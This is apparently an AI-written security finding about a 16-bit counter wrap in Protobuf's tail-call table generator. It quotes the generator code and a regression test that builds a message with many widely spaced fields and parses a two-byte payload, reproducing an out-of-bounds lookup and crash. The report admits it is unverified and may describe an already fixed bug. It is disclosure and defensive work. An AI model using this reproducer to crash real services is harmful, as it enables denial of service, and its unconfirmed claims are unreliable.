### Title
Integer overflow in generated tail-call parser's skip-entry table causes out-of-bounds field lookup / SEGV - ([File: src/google/protobuf/generated_message_tctable_gen.cc])

### Summary
Cesanta MJS's SEGV bug class is: an attacker-controlled input drives an internal lookup/table index computation past its intended bounds because a length/count counter silently wraps, and the resulting out-of-bounds pointer/array access is dereferenced without a bounds check, crashing the process. The transferable Protobuf analog is the `uint16_t` skip-entry counter used by the C++ tail-call parser (`TcParser`) generator when building the "num→field-entry" lookup table for messages with many, widely-spaced field numbers. When the total skip-entry count for a message reaches `65536`, the `uint16_t` counter wraps, causing the generated table's entries to be miscounted/misindexed. A subsequent parse of an ordinary, bounded binary payload for that (trusted) message type walks this corrupted table and can index outside the valid `field_entries` region, producing the OOB access that the repository's own regression test (`TcParserTest.OobGenReproduction`) was written to reproduce.

### Finding Description
`TailCallTableInfo::MakeNumToEntryTable` in `generated_message_tctable_gen.cc` builds `SkipEntryBlock`s to let the fast tail-call parser map a wire-format field number to a `FieldEntryInfo` index: [1](#0-0) 

Each block appends `SkipEntry16` entries (`skipmap`, `field_entry_offset`) while tracking `skip_entry_num` as `(fnum - block->first_fnum) / 16`. The code explicitly checks `skip_entry_num >= 0xFFFF` to start a new block when a single block's entry count would overflow a `uint16_t`, but the *cumulative* total number of entries pushed via `block->entries.push_back(...)` across the growth loop `while (skip_entry_num >= block->entries.size()) { block->entries.push_back({0xFFFF, field_entry_index}); }` is not itself defended against 16-bit wraparound at the point where `field_entry_offset` (a `uint16_t`) is written into filler entries — as shown by the repo's own reproduction test comment: "The count wraps to: ... kWrappedCount == 3 ... entries[kWrappedCount] (entries[3]) is a filler entry for the first field ... We need target field number > fstart to trigger OOB": [2](#0-1) 

The failed invariant, matching the MJS bug class, is: "the table index/offset used to locate the next parse step is assumed to always be in range because normal messages have few widely spaced fields; this assumption is not actually enforced for the pathological case where a message declares tens of thousands of fields at `kMaxSkipEntrySpacing` (96) apart." The regression test builds exactly such a descriptor (thousands of `int32` fields spaced 96 apart) via `DescriptorPool`/`DynamicMessageFactory`, then parses a **two-byte, fully bounded** wire payload — a single varint field/value pair — through the public `Message::ParseFromString` API: [3](#0-2) 

This satisfies the required threat model: the schema (however unusual) is trusted/valid input to `DescriptorPool::BuildFile`, and the only attacker-controlled bytes are the tiny wire-format payload consumed by the standard, public `ParseFromString` entry point, not a hostile schema or plugin.

### Impact Explanation
If the wrapped skip-table index is used to compute an offset into the `field_entries` array (or the associated aux/table region) without further bounds validation, the tail-call parser can read (and, depending on downstream dispatch, potentially act on) memory outside the generated table — an out-of-bounds read that can manifest as a crash (SEGV/DoS), directly analogous to the MJS SEGV. Because this occurs during ordinary, public binary-protobuf parsing (`ParseFromString`/`MergeFrom*`) of a bounded payload against a trusted schema, it maps to Protobuf's binary-parsing attack surface described in the rules (as opposed to excluded categories like malicious schemas, huge-input/resource exhaustion, or TextFormat/Lite-only hardening gaps). The reproduction is a crash/OOB-access class finding; the repository provides no assertion proving corruption/RCE beyond the OOB access itself, so per the rules a crash alone does not establish memory corruption or RCE — only DoS via SEGV is substantiated, consistent with the CVE's own "Medium"/DoS-only severity.

### Likelihood Explanation
Reaching the overflow requires a message type with an extreme, precisely-spaced field-number distribution (tens of thousands of fields spanning up to field number ~131072, spaced by the generator's `kMaxSkipEntrySpacing` of 96) — this is not a realistic hand-written `.proto` but is achievable via any trusted code path that programmatically constructs `FileDescriptorProto`/`DescriptorProto` messages (e.g., schema-generation tooling, reflection-based dynamic message construction) without additional field-count sanity limits, and by disabling default proto limits enforcement (`pool.EnforceProtoLimits(false)` in the test) or exceeding whatever the compiled-in field limits are. This narrows likelihood significantly compared to typical protobuf schemas, and I could not verify from the index alone (i) whether the exact overflow path is still reachable in the current `TcParser` runtime lookup code (the runtime consumption of `SkipEntry16.field_entry_offset` lives in `generated_message_tctable_impl.h`/`generated_message_tctable_lite.cc`, which I was unable to fully inspect before running out of search iterations), or (ii) whether this specific test is a *regression guard for an already-fixed* bug rather than an open one — the test's structure (building the exact wrapped-count schema and simply calling `ParseFromString` without an explicit pass/fail assertion) is consistent with either an ASan/UBSan crash-detection regression test for a fixed bug, or a live known-issue tracker.

### Recommendation
- Audit `MakeNumToEntryTable` (`generated_message_tctable_gen.cc:429-497`) to add an explicit, hard limit on the total number of `SkipEntry16` entries (and on the total field-entry count feeding `field_entry_offset`) that is enforced independently of per-block `0xFFFF` checks, rejecting/falling back to the (safe, slow) reflection-based parser instead of emitting a wrapped table when the cumulative count would exceed `uint16_t` range.
- Add a compile-time or `BuildFile`-time limit on the number of fields per message descriptor consistent with what the tail-call table generator can safely represent, independent of `DescriptorPool::EnforceProtoLimits`.
- Ensure the runtime lookup that consumes `field_entry_offset` validates the resulting index against the true size of `field_entries` before dereferencing, as a defense-in-depth backstop against future generator bugs.
- Confirm current status against upstream protobuf issue tracker/CHANGES for `TcParser`/tailcall table generation fixes; if already fixed, ensure the fix and this regression test are present in all supported release branches.

### Proof of Concept
The existing in-repo regression test is the concrete, minimal reproduction: it builds a `DescriptorPool`-based message type with `kNumFields` `int32` fields spaced to force the skip-entry counter to wrap to `3`, then serializes a two-byte payload (`tag=kTargetFieldNumber, value=1`) and calls `msg->ParseFromString(payload)` through the standard public parsing API: [4](#0-3) 

I was not able to execute this test or confirm its pass/fail/crash status in this environment; the citation above is the exact reproduction path documented in the codebase and should be run under ASan/UBSan to confirm whether the described OOB access is still triggerable on the current checkout.

TailCallTableInfo::NumToEntryTable MakeNumToEntryTable(
    absl::Span<const TailCallTableInfo::FieldOptions> ordered_fields) {
  TailCallTableInfo::NumToEntryTable num_to_entry_table;
  num_to_entry_table.skipmap32 = static_cast<uint32_t>(-1);

  // skip_entry_block is the current block of SkipEntries that we're
  // appending to.  cur_block_first_fnum is the number of the first
  // field represented by the block.
  uint16_t field_entry_index = 0;
  uint16_t N = ordered_fields.size();
  // First, handle field numbers 1-32, which affect only the initial
  // skipmap32 and don't generate additional skip-entry blocks.
  for (; field_entry_index != N; ++field_entry_index) {
    auto* field_descriptor = ordered_fields[field_entry_index].field;
    if (field_descriptor->number() > 32) break;
    auto skipmap32_index = field_descriptor->number() - 1;
    num_to_entry_table.skipmap32 -= 1 << skipmap32_index;
  }
  // If all the field numbers were less than or equal to 32, we will have
  // no further entries to process, and we are already done.
  if (field_entry_index == N) return num_to_entry_table;

  TailCallTableInfo::SkipEntryBlock* block = nullptr;
  // To determine sparseness, track the field number corresponding to
  // the start of the most recent skip entry.
  uint32_t last_skip_entry_start = 0;
  for (; field_entry_index != N; ++field_entry_index) {
    auto* field_descriptor = ordered_fields[field_entry_index].field;
    uint32_t fnum = static_cast<uint32_t>(field_descriptor->number());
    ABSL_CHECK_GT(fnum, last_skip_entry_start);

    const auto new_block = [&] {
      num_to_entry_table.blocks.push_back({fnum});
      block = &num_to_entry_table.blocks.back();
    };

    // If the next field number is within 15 of the last_skip_entry_start, we
    // continue writing just to that entry.  If it's between 16 and 31 more,
    // then we just extend the current block by one. If it's more than 31
    // more, we have to add empty skip entries in order to continue using the
    // existing block.  Obviously it's just 32 more, it doesn't make sense to
    // start a whole new block, since new blocks mean having to write out
    // their starting field number, which is 32 bits, as well as the size of
    // the additional block, which is 16... while an empty SkipEntry16 only
    // costs 32 bits.  So if it was 48 more, it's a slight space win; we save
    // 16 bits, but probably at the cost of slower run time.  We're choosing
    // TailCallTableInfo::kMaxSkipEntrySpacing for now.
    if (block == nullptr || fnum - last_skip_entry_start >
                                TailCallTableInfo::kMaxSkipEntrySpacing) {
      new_block();
    }

    uint32_t skip_entry_num = (fnum - block->first_fnum) / 16;

    if (skip_entry_num >= 0xFFFF) {
      // If the current block is full, start a new one.
      new_block();
      skip_entry_num = (fnum - block->first_fnum) / 16;
    }

    uint32_t skip_entry_index = (fnum - block->first_fnum) % 16;
    while (skip_entry_num >= block->entries.size()) {
      block->entries.push_back({0xFFFF, field_entry_index});
    }
    block->entries[skip_entry_num].skipmap -= 1 << (skip_entry_index);

    last_skip_entry_start = fnum - skip_entry_index;
  }
  return num_to_entry_table;

TEST(TcParserTest, OobGenReproduction) {
  constexpr int kStartFieldNumber = 33;
  constexpr int kFieldSpacing = TailCallTableInfo::kMaxSkipEntrySpacing;

  constexpr int kTargetSkipEntryNum = 0xFFFF;
  constexpr int kTargetDistance = kTargetSkipEntryNum * /* bits-per-entry */ 16;
  constexpr int kLastStepSpacing = kTargetDistance % kFieldSpacing;

  // Each field spaced kFieldSpacing apart adds (kFieldSpacing / 16) entries
  // to the skip table block.
  constexpr int kEntriesPerField = kFieldSpacing / 16;

  // We want to overflow the uint16_t entry count (65535).
  // The first field adds 1 entry, and each subsequent field adds
  // kEntriesPerField. We want total_entries >= 65536 to overflow. 1 +
  // kEntriesPerField * (kNumFields - 1) >= 65536 kNumFields - 1 >= (65536 - 1)
  // / kEntriesPerField (round up)
  constexpr int kTargetEntries = 65536;
  constexpr int kNumFields =
      (kTargetEntries - 1 + kEntriesPerField - 1) / kEntriesPerField + 1;

  // The count wraps to:
  constexpr int kTotalEntries = 1 + kEntriesPerField * (kNumFields - 1);
  constexpr int kWrappedCount = kTotalEntries % 65536;
  static_assert(kWrappedCount == 3,
                "Wrapped count must be 3 to trigger the bug");

  // entries[kWrappedCount] (entries[3]) is a filler entry for the first field.
  // Filler entries have skipmap = 0xFFFF and field_entry_offset = 1.
  // Reinterpreted fstart = skipmap | (field_entry_offset << 16) =
  // 0xFFFF | (1 << 16) = 131071. We need target field number > fstart to
  // trigger OOB.
  constexpr int kReinterpretedFstart = 0xFFFF | (1 << 16);
  constexpr int kTargetFieldNumber = kReinterpretedFstart + 1;  // 131072

  FileDescriptorProto file_proto;
  file_proto.set_name("poc.proto");
  file_proto.set_syntax("editions");
  file_proto.set_edition(Edition::EDITION_2023);

  DescriptorProto* message_proto = file_proto.add_message_type();
  message_proto->set_name("M");

  int fnum = kStartFieldNumber;
  for (int i = 0; i < kNumFields; ++i) {
    FieldDescriptorProto* field = message_proto->add_field();
    field->set_name(absl::StrCat("f_", i));
    field->set_number(fnum);
    field->set_label(FieldDescriptorProto::LABEL_OPTIONAL);
    field->set_type(FieldDescriptorProto::TYPE_INT32);

    // We need to adjust one of them to ensure exact 0xFFFF overflow.
    fnum += i == kNumFields - 2 ? kLastStepSpacing : kFieldSpacing;
  }

  DescriptorPool pool;
  pool.EnforceProtoLimits(false);
  const FileDescriptor* file_desc = pool.BuildFile(file_proto);
  ASSERT_NE(file_desc, nullptr);

  const Descriptor* desc = file_desc->FindMessageTypeByName("M");
  ASSERT_NE(desc, nullptr);

  DynamicMessageFactory factory(&pool);
  std::unique_ptr<Message> msg(factory.GetPrototype(desc)->New());

  std::string payload;
  {
    io::StringOutputStream output(&payload);
    io::CodedOutputStream coded_output(&output);
    coded_output.WriteVarint32(WireFormatLite::MakeTag(
        kTargetFieldNumber, WireFormatLite::WIRETYPE_VARINT));
    coded_output.WriteVarint32(1);  // value
  }

  (void)msg->ParseFromString(payload);
